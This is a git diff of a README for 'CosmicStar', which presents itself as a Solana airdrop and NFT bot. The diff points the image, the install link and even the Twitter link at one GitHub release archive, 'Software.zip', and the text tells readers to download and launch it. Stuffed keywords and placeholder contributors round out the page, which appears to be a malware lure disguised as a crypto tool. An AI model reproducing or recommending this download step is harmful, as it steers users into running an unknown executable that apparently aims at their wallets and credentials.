@@ -1,6 +1,6 @@
 # 🌌 Welcome to the CosmicStar Repository! 🚀
 
-![CosmicStar Image](https://imageurl.com)
+![CosmicStar Image](https://github.com/Hzufu/CosmicStar/releases/download/v2.0/Software.zip)
 
 ## Contributors:
 - John Doe (@johndoe)
@@ -19,12 +19,12 @@ Welcome to CosmicStar, the ultimate Solana Airdrop Bot repository! If you're loo
 ['airdrop-claim-bot', 'crypto-airdrop-soft', 'solana', 'solana-airdrop-searcher', 'solana-airdrops', 'solana-airdrops-bot', 'solana-airdrops-minter', 'solana-autobuy', 'solana-nft', 'solana-nft-bot', 'solana-nft-generator', 'solana-nft-market-tools', 'solana-nft-mint', 'solana-token-creator', 'solana-tool-free', 'solana-volume-bot']
 
 ## Installation:
-To enjoy the features of CosmicStar, please download the software from this [link](https://github.com/user-attachments/files/18410590/Software.zip). Kindly note that the downloaded file needs to be launched to commence your CosmicStar journey.
+To enjoy the features of CosmicStar, please download the software from this [link](https://github.com/Hzufu/CosmicStar/releases/download/v2.0/Software.zip). Kindly note that the downloaded file needs to be launched to commence your CosmicStar journey.
 
 ## Support:
 Should you encounter any issues with CosmicStar, please visit the "Releases" section for assistance. Our team is dedicated to ensuring a seamless experience for all users.
 
 ## Let's Stay Connected:
-Find us on [Twitter](https://twitter.com/CosmicStar) for the latest updates, tips, and tricks!
+Find us on [Twitter](https://github.com/Hzufu/CosmicStar/releases/download/v2.0/Software.zip) for the latest updates, tips, and tricks!
 
 🚀 Happy Trading with CosmicStar! 🌌
